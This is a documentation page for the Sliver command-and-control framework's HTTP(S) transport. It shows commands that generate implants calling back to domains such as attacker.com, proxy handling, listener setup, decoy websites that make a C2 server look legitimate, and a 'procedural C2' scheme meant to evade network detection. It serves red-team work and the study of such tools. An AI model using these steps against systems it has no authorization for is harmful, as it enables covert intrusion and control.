
⚠️ __This page is a work in progress__

# Setup

Sliver supports proxy-aware C2 over both HTTP and HTTPS, however since Sliver does not rely upon the SSL/TLS layer for security these protocols are considered somewhat synonymous. There are separate commands for the listeners but an implant generated with `--http` may attempt to connect over both HTTP and HTTPS (see "under the hood" for more details.
 

## Generate the Implant

Sliver implants are compiled with a baked-in (but obfuscated of course) server domain that they will reach back out to. To generate a sliver implant that communicates to a server at `example.com` run the following:

#### Basic Example

```
sliver > generate --http example.com --os mac

[*] Generating new darwin/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/WORKING_HACIENDA
```

#### Multiple Domains

You can also specify multiple domains, in the event the implant cannot connect to the first it will subsequently attempt to connect to each domain you specified in order. Subsequent attempts are made based on the `--reconnect` argument (default 60 seconds). If no attempts are successful, the implant will loop across all of the domains until `--max-errors` (default 1000) is reached, at which point the implant will terminate execution:

```
sliver > generate --http example.com,attacker.com

[*] Generating new windows/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/IMPRESSED_METHANE
```

#### Proxies

The implant attempts to auto-detect proxy settings using a modified version of the [go-get-proxied](https://github.com/rapid7/go-get-proxied) library. It supports detection of system proxy settings on Windows, MacOS, and Linux. In the event the implant cannot make a successful HTTP/HTTPS connection for a given domain using the system proxy settings, it will also attempt to make a connection to the same domain ignoring the proxy settings. The order of connection attempts is as follows:

1. HTTPS over system proxy
1. HTTP over system proxy
1. HTTPS direct connect
1. HTTP direct connect


#### Proxy Configuration

The priority of retrieval is the following:
-  **Windows**
   - Environment Variable: `HTTPS_PROXY`, `HTTP_PROXY`, `FTP_PROXY`, or `ALL_PROXY`. `NO_PROXY` is respected.
   - Internet Options: Automatically detect settings (`WPAD`)
   - Internet Options: Use automatic configuration script (`PAC`)
   - Internet Options: Manual proxy server
   - WINHTTP: (`netsh winhttp`)
- **Linux**
   - Environment Variable: `HTTPS_PROXY`, `HTTP_PROXY`, `FTP_PROXY`, or `ALL_PROXY`. `NO_PROXY` is respected.
- **MacOS**
   - Environment Variable: `HTTPS_PROXY`, `HTTP_PROXY`, `FTP_PROXY`, or `ALL_PROXY`. `NO_PROXY` is respected.
   - Network Settings: `scutil`


## Start the Listener 

To start an HTTP listener use the `http` command, with no parameters this will start a listener on port 80 and respond to any domain (i.e., HTTP `Host:`) that comes in:

```
sliver > http
```

You can optionally restrict the listener to only respond to specific domain using the `--domain` flag, currently each listener can only accept a single domain (but you can start any number of listeners you want):

```
sliver > http --domain example.com
```


## Static Content

Sliver can stand up a website on your HTTP(S) listener in order to make the server look more legitimate. For example, you could put a default IIS index page here and mimic a normal-looking server in case someone comes by snooping. You can manage static content using the `websites` command (see `websites --help`):

```
websites --website fake-blog --web-path / --content ./index.html add
```

Each "website" is identified by a name (`fake-blog` in the example above) and is essentially just key<->value pairs request paths (e.g. `/foo/bar.html`) and response's content. Currently we don't support any regex matching for paths, it has to be an exact match, so keep that in mind if you're linking to content.

__Note:__ C2 related messages are identified, intercepted, and responded to prior to checking for user-provided `website` content, so you can actually map content to any URL used for C2.

To use your website with an HTTP(S) listener, specify it using `--website` when you start the listener:

```
sliver > http --website fake-blog --domain example.com
```

## SSL/TLS Certificates

By default when using the `https` listener Sliver will simply generate a random self-signed certificate. However, other options do exist. The `https` listener also supports automatic TLS certificates via Let's Encrypt, which can be enabled using the `--lets-encrypt` flag.

```
sliver > https --domain example.com --lets-encrypt
```

This uses Let's Encrypt/ACME HTTP validation, so the server will need the ability to start a public listener and you'll need to have the DNS for your `--domain` pointed to the Sliver server. If you're having issues pulling a certificate be sure to [check the logs](https://github.com/BishopFox/sliver/wiki/Troubleshooting).

You can also upload your own SSL/TLS certificate/key pairs:

```
sliver > https --domain example.com --cert ./cert.pem --key ./key.pem --website fake-blog
```

# Under the Hood

This section covers the "under the hood" implementation details of Sliver's HTTP C2, and may be useful for users want to understand, extend, or are simply curious about Sliver's design.

### Design Goals

The primary goals of the existing HTTP C2 design are to:

* __Reliable Connections__ The implants foremost goal is to get a connection out of the network, regardless of the environment's configuration. 
* __Data Security__ I won't cover this here, but [click here](https://github.com/BishopFox/sliver/wiki/Transport-Encryption) for details.
* __Network Layer Evasion__ C2 messages should be hard to detect from the network layer alone, without the user having to build custom profiles. This is done via "Procedural C2" as detailed below. 

### Procedural C2

This is basically something I just made up, but the idea is that instead of creating custom C2 profiles that define where to put data in an HTTP request we [procedurally generate](https://en.wikipedia.org/wiki/Procedural_generation) an HTTP request with the data in it. In practice this seems to work pretty well, though the number of variations built into Sliver is somewhat limited right now. If the technique proves to work well in the field we'll likely expand it (and at some point it may be a good idea to base the generation based on some type of seeded RNG so that a given request can be regenerated given a seed).

The high level process to generate and send a request is:
1. Randomly generate the request path using built-in path segments. The path will have on of the following extensions, which indicate the type of message. Everything in the path except for the extension is ignored by the server:

* `.txt` = RSA key exchange
* `.jsp` = Start session
* `.php` = Session messages
* `.js` = Long poll endpoint
* `.png` = Stop/kill session

2. Randomly select an encoder from `server/encoders`, each encoder has a unique "Encoder ID"
3. Generate a `nonce`, the nonce is equal to a random number times the `EncoderModulus` plus the encoder ID; the `EncoderModulus` is a constant value. The server does the opposite (nonce modulo `EncoderModulus`) to determine the original Encoder ID.

```
nonce := (insecureRand.Intn(maxN) * EncoderModulus) + encoderID
encoderId := nonce % EncoderModulus
```

The nonce is included in the request as the query parameter `_`, the idea is that this a standard pattern for "cache busting" and at a glance looks legitimate. The server also ignores any request that does not contain a valid nonce. A "NOP" nonce is also supported, which is an encoder ID of zero (i.e. the modulo of the nonce equals zero).






